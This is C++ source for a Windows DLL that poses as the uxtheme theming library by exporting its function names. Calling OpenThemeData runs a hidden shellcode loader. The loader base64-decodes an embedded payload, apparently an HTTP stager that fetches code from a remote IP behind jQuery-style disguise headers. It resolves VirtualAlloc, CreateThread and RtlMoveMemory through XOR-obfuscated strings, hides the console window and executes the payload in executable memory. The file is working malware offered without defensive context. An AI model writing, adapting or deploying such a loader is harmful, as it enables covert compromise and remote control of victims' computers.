// dllmain.cpp : Defines the entry point for the DLL application.
#include <stdio.h>
#include "pch.h"
#include <windows.h>
#include <iostream>
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string>
#include <wincrypt.h>

#define V_LENGTH 12
#define C_LENGTH 12
#define R_LENGTH 13
#define _CRT_SECURE_NO_WARNINGS

using namespace std;
template <typename F>
struct privDefer {
	F f;
	privDefer(F f) : f(f) {}
	~privDefer() { f(); }
};

template <typename F>
privDefer<F> defer_func(F f) {
	return privDefer<F>(f);
}

#define DEFER_1(x, y) x##y
#define DEFER_2(x, y) DEFER_1(x, y)
#define DEFER_3(x)    DEFER_2(x, __COUNTER__)
#define defer(code)   auto DEFER_3(_defer_) = defer_func([&](){code;})

#ifdef UNICODE
#define GetModuleFileName  GetModuleFileNameW
#else
#define GetModuleFileName  GetModuleFileNameA
#endif

unsigned char encoded[] = "/EiD5PDoyAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwJ1couAiAAAAEiFwHRnSAHQUItIGESLQCBJAdDjVkj/yUGLNIhIAdZNMclIMcCsQcHJDUEBwTjgdfFMA0wkCEU50XXYWESLQCRJAdBmQYsMSESLQBxJAdBBiwSISAHQQVhBWF5ZWkFYQVlBWkiD7CBBUv/gWEFZWkiLEulP////XWoASb53aW5pbmV0AEFWSYnmTInxQbpMdyYH/9VIMclIMdJNMcBNMclBUEFQQbo6Vnmn/9Xrc1pIicFBuJEfAABNMclBUUFRagNBUUG6V4mfxv/V61lbSInBSDHSSYnYTTHJUmgAAkCEUlJBuutVLjv/1UiJxkiDw1BqCl9IifFIidpJx8D/////TTHJUlJBui0GGHv/1YXAD4WdAQAASP/PD4SMAQAA69Pp5AEAAOii////L2pxdWVyeS0zLjMuMi5zbGltLm1pbi5qcwCV/h9DgOmIG5aQZTH+a1lnDB53QypKwNBP7OK5leLeznGdjWy3pcQ/vpEtw59dmaoDSIdRsQBBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LCovKjtxPTAuOA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovL2NvZGUuanF1ZXJ5LmNvbS8NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4zOyBXaW42NDsgeDY0OyBydjo4Ny4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94Lzg3LjANCgAq229QI5Wv+gbcVSiJFLkip3DMb696axsbMSbOJN9uSiWWvKptsRQAQb7wtaJW/9VIMcm6AABAAEG4ABAAAEG5QAAAAEG6WKRT5f/VSJNTU0iJ50iJ8UiJ2kG4ACAAAEmJ+UG6EpaJ4v/VSIPEIIXAdLZmiwdIAcOFwHXXWFhYSAWvDwAAUMPon/3//zQzLjEzOS4xMTQuMTM0AAAAJTc=";

const int key = 0x06;


int VEncrypted[V_LENGTH] = { 0x50, 0x6f, 0x74, 0x72, 0x73, 0x67, 0x6a, 0x47, 0x6a, 0x6a, 0x69, 0x65 };
int CEncrypted[C_LENGTH] = { 0x45, 0x74, 0x63, 0x67, 0x72, 0x63, 0x52, 0x6e, 0x74, 0x63, 0x67, 0x62 };
int REncrypted[R_LENGTH] = { 0x54, 0x72, 0x6a, 0x4b, 0x69, 0x70, 0x63, 0x4b, 0x63, 0x6b, 0x69, 0x74, 0x7f };


void decrypt_and_run(const unsigned char* encoded_code, size_t length)
{

    DWORD decoded_length = 0;
    BYTE* decoded_code = NULL;
    if (!CryptStringToBinaryA((LPCSTR)encoded_code, length, CRYPT_STRING_BASE64, NULL, (DWORD*)&decoded_length, NULL, NULL))
    {
        std::cout << "Failed to decode code." << std::endl;
        return;
    }
    decoded_code = new BYTE[decoded_length];
    if (!CryptStringToBinaryA((LPCSTR)encoded_code, length, CRYPT_STRING_BASE64, decoded_code, (DWORD*)&decoded_length, NULL, NULL))
    {
        std::cout << "Failed to decode code." << std::endl;
        delete[] decoded_code;
        return;
    }

    HMODULE hModule = GetModuleHandle("kernel32.dll");

    char VName[V_LENGTH + 1];
    for (int i = 0; i < V_LENGTH; i++)
    {
        VName[i] = VEncrypted[i] ^ key;
    }
    VName[V_LENGTH] = '\0';


    char CName[C_LENGTH + 1];
    for (int i = 0; i < C_LENGTH; i++)
    {
        CName[i] = CEncrypted[i] ^ key;
    }
    CName[C_LENGTH] = '\0';

    char RName[R_LENGTH + 1];
    for (int i = 0; i < R_LENGTH; i++)
    {
        RName[i] = REncrypted[i] ^ key;
    }
    RName[R_LENGTH] = '\0';


    FARPROC pVA = GetProcAddress(hModule, VName);
    if (!pVA)
    {
        std::cout << "Failed to get address of V." << std::endl;
        delete[] decoded_code;
        return;
    }

    FARPROC pVF = GetProcAddress(hModule, "VirtualFree");

    FARPROC pC = GetProcAddress(hModule, CName);
    if (!pC)
    {
        std::cout << "Failed to get address of C." << std::endl;
        delete[] decoded_code;
        return;
    }

    FARPROC pR = GetProcAddress(hModule, RName);
    if (!pR)
    {
        std::cout << "Failed to get address of R." << std::endl;
        delete[] decoded_code;
        return;
    }


    LPVOID alloc_address = reinterpret_cast<LPVOID(*)(DWORD, SIZE_T, DWORD, DWORD)>(pVA)((DWORD)NULL, decoded_length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!alloc_address)
    {
        std::cout << "Failed to allocate memory." << std::endl;
        delete[] decoded_code;
        return;
    }
    reinterpret_cast<void(*)(void*, const void*, size_t)>(pR)(alloc_address, decoded_code, decoded_length);

    HANDLE thread = ((HANDLE(*)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD))pC)(NULL, 0, (LPTHREAD_START_ROUTINE)alloc_address, NULL, 0, NULL);
    if (!thread)
    {
        std::cout << "Failed to create thread." << std::endl;
        ((BOOL(*)(LPVOID, SIZE_T, DWORD))pVF)(alloc_address, 0, MEM_RELEASE);
        delete[] decoded_code;
        return;
    }

    WaitForSingleObject(thread, INFINITE);
    ((BOOL(*)(LPVOID, SIZE_T, DWORD))pVF)(alloc_address, 0, MEM_RELEASE);
    delete[] decoded_code;

}


BOOL APIENTRY Main()
{
		
    HWND hWnd = GetConsoleWindow();
    if (hWnd != NULL)
    {
        ShowWindow(hWnd, SW_HIDE);
    }

    decrypt_and_run(encoded, sizeof(encoded));
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:

	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

//extern "C" __declspec(dllexport) void BeginBufferedAnimation() { Main(); }
//extern "C" __declspec(dllexport) void GetThemeFont() { Main(); }
extern "C" __declspec(dllexport) void OpenThemeData() { Main(); }
//extern "C" __declspec(dllexport) void DrawThemeBackground() { Main(); }
//extern "C" __declspec(dllexport) void GetThemeBackgroundContentRect() { Main(); }
//extern "C" __declspec(dllexport) void EnableThemeDialogTexture() { Main(); }
//extern "C" __declspec(dllexport) void DrawThemeTextEx() { Main(); }
//extern "C" __declspec(dllexport) void BufferedPaintStopAllAnimations() { Main(); }
//extern "C" __declspec(dllexport) void GetThemePartSize() { Main(); }
//extern "C" __declspec(dllexport) void BufferedPaintRenderAnimation() { Main(); }
//extern "C" __declspec(dllexport) void EndBufferedAnimation() { Main(); }
//extern "C" __declspec(dllexport) void SetWindowTheme() { Main(); }
//extern "C" __declspec(dllexport) void GetThemeTransitionDuration() { Main(); }
//extern "C" __declspec(dllexport) void DrawThemeParentBackground() { Main(); }
//extern "C" __declspec(dllexport) void CloseThemeData() { Main(); }
int BeginBufferedAnimation() { return 0; }
int GetThemeFont() { return 0; }
//int OpenThemeData() { return 0; }
int DrawThemeBackground() { return 0; }
int GetThemeBackgroundContentRect() { return 0; }
int EnableThemeDialogTexture() { return 0; }
int BufferedPaintStopAllAnimations() { return 0; }
int BufferedPaintRenderAnimation() { return 0; }
int DrawThemeTextEx() { return 0; }
int GetThemePartSize() { return 0; }
int EndBufferedAnimation() { return 0; }
int SetWindowTheme() { return 0; }
int GetThemeTransitionDuration() { return 0; }
int DrawThemeParentBackground() { return 0; }
int CloseThemeData() { return 0; }